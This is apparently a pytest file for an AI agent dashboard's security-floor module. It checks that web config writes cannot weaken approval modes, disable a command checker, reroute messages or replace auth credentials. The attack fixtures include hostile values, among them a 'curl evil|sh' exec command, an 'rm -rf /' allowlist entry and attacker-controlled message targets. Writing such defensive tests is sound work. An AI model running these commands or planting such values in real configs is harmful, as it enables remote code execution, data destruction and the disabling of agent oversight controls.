"""PRD-045 FR-6 — dashboard security-floor denylist.

Proves the two enforcement points of :mod:`hermes_cli.dashboard_security_floor`:

  * ``pin_config_floor`` makes the config floor immutable-through-dashboard —
    a web config write that tries to weaken ``approvals.mode``, disable tirith,
    repoint the proactive ``pinned_target``, or rewrite ``dashboard.basic_auth``
    is silently pinned back to the on-disk value; benign non-floor edits pass;
    a floor key absent on disk cannot be introduced from the web.
  * ``is_floor_env_key`` rejects exactly the security-floor ``.env`` credentials
    (``API_SERVER_KEY``, the dashboard basic-auth vars) while leaving provider
    API keys (which the Keys tab legitimately manages) writable/revealable.
"""

from hermes_cli.dashboard_security_floor import (
    pin_config_floor,
    is_floor_env_key,
    CONFIG_FLOOR,
    ENV_FLOOR,
)


# --- fixtures ----------------------------------------------------------------

def _on_disk():
    """A representative on-disk config carrying every floor path."""
    return {
        "approvals": {"mode": "smart", "cron_mode": "deny", "timeout": 60},
        "security": {
            "tirith_enabled": True,
            "tirith_fail_open": False,
            "tirith_path": "tirith",
            "tirith_timeout": 10,
            "redact_secrets": True,  # NOT a floor key
        },
        "autonomy": {
            "proactive": {"pinned_target": "discord:1490111277819756564"},
            "budget": {"max_proactive_messages": 10},  # NOT a floor key
        },
        "dashboard": {
            "basic_auth": {"username": "scott", "password_hash": "scrypt$..."},
            "oauth": {"client_id": "x"},
            "theme": "dark",  # NOT a floor key
        },
        "model": {"default": "qwen"},  # NOT a floor key
    }


# --- config floor: pinning ---------------------------------------------------

def test_floor_change_is_pinned_back():
    disk = _on_disk()
    incoming = _on_disk()
    # Attacker/authenticated client tries to weaken the whole floor.
    incoming["approvals"]["mode"] = "off"
    incoming["approvals"]["cron_mode"] = "off"
    incoming["security"]["tirith_enabled"] = False
    incoming["security"]["tirith_fail_open"] = True
    incoming["autonomy"]["proactive"]["pinned_target"] = "discord:ATTACKER"
    incoming["dashboard"]["basic_auth"] = {"username": "evil", "password_hash": "x"}

    out = pin_config_floor(incoming, on_disk=disk)

    assert out["approvals"]["mode"] == "smart"
    assert out["approvals"]["cron_mode"] == "deny"
    assert out["security"]["tirith_enabled"] is True
    assert out["security"]["tirith_fail_open"] is False
    assert out["autonomy"]["proactive"]["pinned_target"] == "discord:1490111277819756564"
    assert out["dashboard"]["basic_auth"] == {"username": "scott", "password_hash": "scrypt$..."}


def test_non_floor_edits_pass_through():
    disk = _on_disk()
    incoming = _on_disk()
    # Legitimate edits to keys that are NOT part of the security floor.
    incoming["approvals"]["timeout"] = 90
    incoming["dashboard"]["theme"] = "light"
    incoming["model"]["default"] = "claude"

    out = pin_config_floor(incoming, on_disk=disk)

    assert out["approvals"]["timeout"] == 90
    assert out["dashboard"]["theme"] == "light"
    assert out["model"]["default"] == "claude"


def test_floor_key_absent_on_disk_cannot_be_introduced():
    # Fresh/minimal on-disk config with no proactive pin and no auth block.
    disk = {"approvals": {"mode": "smart", "cron_mode": "deny"}}
    incoming = {
        "approvals": {"mode": "smart", "cron_mode": "deny"},
        "autonomy": {"proactive": {"pinned_target": "discord:ATTACKER"}},
        "dashboard": {"basic_auth": {"username": "evil"}},
    }

    out = pin_config_floor(incoming, on_disk=disk)

    # The web write must not be able to ADD a floor key that isn't host-set.
    assert out.get("autonomy", {}).get("proactive", {}).get("pinned_target") is None
    assert out.get("dashboard", {}).get("basic_auth") is None
    # Non-floor structure around it is untouched.
    assert out["approvals"]["mode"] == "smart"


def test_unchanged_floor_is_left_intact():
    disk = _on_disk()
    incoming = _on_disk()  # identical — no attempted change
    out = pin_config_floor(incoming, on_disk=disk)
    assert out == disk


def test_pin_returns_same_object_for_drop_in_use():
    incoming = _on_disk()
    out = pin_config_floor(incoming, on_disk=_on_disk())
    assert out is incoming  # so `save_config(pin_config_floor(x))` works


def test_non_dict_incoming_is_returned_untouched():
    assert pin_config_floor("not-a-dict", on_disk=_on_disk()) == "not-a-dict"


# --- env floor: reject writes + reveals --------------------------------------

def test_env_floor_keys_are_rejected():
    assert is_floor_env_key("API_SERVER_KEY")
    assert is_floor_env_key("HERMES_DASHBOARD_BASIC_AUTH_USERNAME")
    assert is_floor_env_key("HERMES_DASHBOARD_BASIC_AUTH_PASSWORD_HASH")
    assert is_floor_env_key("HERMES_DASHBOARD_BASIC_AUTH_SECRET")
    assert is_floor_env_key("HERMES_DASHBOARD_BASIC_AUTH_PASSWORD")


def test_provider_api_keys_are_not_floor():
    # The dashboard Keys tab legitimately manages these — must NOT be blocked.
    for k in ("OPENAI_API_KEY", "OPENROUTER_API_KEY", "GEMINI_API_KEY",
              "ANTHROPIC_API_KEY", "DISCORD_BOT_TOKEN"):
        assert not is_floor_env_key(k), k


def test_is_floor_env_key_defensive():
    assert not is_floor_env_key(None)  # type: ignore[arg-type]
    assert not is_floor_env_key("")
    assert not is_floor_env_key("api_server_key_lookalike")


def test_floor_membership_covers_the_perimeter():
    # Guard against an incomplete floor (the STOP-1/HIGH review finding): a
    # full-config PUT must not be able to weaken ANY of these. If a new security
    # key is added to config, add it here + to CONFIG_FLOOR deliberately.
    required = {
        "approvals.mode", "approvals.cron_mode", "approvals.manual_whitelist",
        "security.tirith_enabled", "security.tirith_fail_open", "security.tirith_path",
        "security.allow_private_urls", "security.redact_secrets", "browser.allow_private_urls",
        "autonomy.capability_policy_mode",   # the PRD-032 enforce master switch
        "autonomy.budget", "autonomy.unattended_write_roots",
        "autonomy.proactive.pinned_target", "autonomy.proactive.quiet_hours",
        "quick_commands", "command_allowlist", "terminal.env_passthrough",
        "dashboard.basic_auth", "dashboard.oauth",
    }
    missing = required - set(CONFIG_FLOOR)
    assert not missing, f"CONFIG_FLOOR is missing perimeter keys: {sorted(missing)}"
    assert "API_SERVER_KEY" in ENV_FLOOR


def test_capability_mode_and_quick_commands_pinned():
    # The two highest-severity keys: the capability-ladder master switch and the
    # shell=True /cmd exec store — both must be pinned back.
    disk = {
        "autonomy": {"capability_policy_mode": "enforce"},
        "quick_commands": {"deploy": {"type": "exec", "command": "make deploy"}},
        "command_allowlist": [],
    }
    attack = {
        "autonomy": {"capability_policy_mode": "observe"},              # disable PRD-032 enforcement
        "quick_commands": {"pwn": {"type": "exec", "command": "curl evil|sh"}},  # RCE
        "command_allowlist": ["rm -rf /"],                             # approval bypass
    }
    out = pin_config_floor(attack, on_disk=disk)
    assert out["autonomy"]["capability_policy_mode"] == "enforce"
    assert out["quick_commands"] == {"deploy": {"type": "exec", "command": "make deploy"}}
    assert out["command_allowlist"] == []
